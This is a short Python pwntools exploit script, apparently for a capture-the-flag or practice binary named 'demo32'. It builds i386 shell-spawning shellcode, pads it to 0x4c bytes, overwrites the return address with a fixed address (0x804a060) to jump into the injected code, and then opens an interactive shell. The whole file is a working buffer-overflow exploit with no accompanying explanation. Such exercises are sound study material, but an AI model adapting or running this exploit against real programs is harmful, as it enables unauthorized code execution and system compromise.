from pwn import *

context.log_level = "debug"

io = process("./demo32")

io.recv()



shellcode = shellcraft.i386.sh()

payload1 = asm(shellcode)
print(payload1)
pause()
io.sendline(payload1.ljust(0x4c,b"A")+p32(0x804a060))
pause()

io.interactive()

